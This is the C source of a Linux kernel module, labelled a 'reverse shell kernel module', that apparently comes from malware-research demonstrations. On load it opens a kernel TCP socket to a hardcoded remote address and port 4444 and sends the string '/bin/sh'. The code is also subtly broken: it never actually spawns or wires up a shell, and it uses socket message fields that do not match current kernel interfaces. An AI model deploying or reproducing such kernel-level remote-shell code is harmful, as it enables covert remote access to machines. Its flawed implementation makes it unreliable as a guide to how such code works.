#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/socket.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/sched.h>
#include <linux/unistd.h>
#include <net/sock.h>
#include <linux/uaccess.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("cocomelonc");
MODULE_DESCRIPTION("reverse shell kernel module");
MODULE_VERSION("0.01");

#define REMOTE_IP "192.168.56.1"  // Target IP
#define REMOTE_PORT 4444  // Target Port

static struct socket *client_socket = NULL;

static int __init reverse_shell_init(void) {
  struct sockaddr_in sa;
  struct msghdr msg;
  struct iovec iov;
  char shell_command[] = "/bin/sh";

  // create a socket
  if (sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &client_socket) < 0) {
    printk(KERN_ERR "error creating socket\n");
    return -1;
  }

  // set up the server address
  memset(&sa, 0, sizeof(sa));
  sa.sin_family = AF_INET;
  sa.sin_port = htons(REMOTE_PORT);
  sa.sin_addr.s_addr = in_aton(REMOTE_IP);

  // connect to the remote server
  if (client_socket->ops->connect(client_socket, (struct sockaddr *)&sa, sizeof(sa), 0) < 0) {
    printk(KERN_ERR "failed to connect to the server\n");
    sock_release(client_socket);
    return -1;
  }

  printk(KERN_INFO "connected to %s:%d\n", REMOTE_IP, REMOTE_PORT);

  // prepare for sending the shell command to remote server
  iov.iov_base = shell_command;
  iov.iov_len = sizeof(shell_command);
  msg.msg_name = (struct sockaddr *)&sa;
  msg.msg_namelen = sizeof(sa);
  msg.msg_iov = &iov;
  msg.msg_iovlen = 1;

  // Send the shell command
  if (client_socket->ops->sendmsg(client_socket, &msg, sizeof(shell_command)) < 0) {
    printk(KERN_ERR "failed to send command\n");
    sock_release(client_socket);
    return -1;
  }

  printk(KERN_INFO "shell command sent\n");

  return 0;
}

static void __exit reverse_shell_exit(void) {
  if (client_socket) {
    sock_release(client_socket);
  }
  printk(KERN_INFO "reverse shell module unloaded\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
